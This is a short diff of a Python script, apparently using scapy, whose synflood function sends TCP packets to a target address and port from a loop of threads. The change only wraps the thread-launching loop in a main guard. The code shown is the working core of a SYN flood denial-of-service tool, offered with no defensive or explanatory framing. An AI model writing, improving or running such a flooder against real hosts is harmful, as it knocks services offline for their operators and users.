@@ -24,8 +24,10 @@ def synflood(target,port):
    send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x),verbose=0)
 
 
-for x in range(0,args.TH):
- thread.start_new_thread(synflood, (args.USER,args.PORT))
+
+if __name__ == "__main__":
+ for x in range(0,args.TH):
+  thread.start_new_thread(synflood, (args.USER,args.PORT))
 
 
 
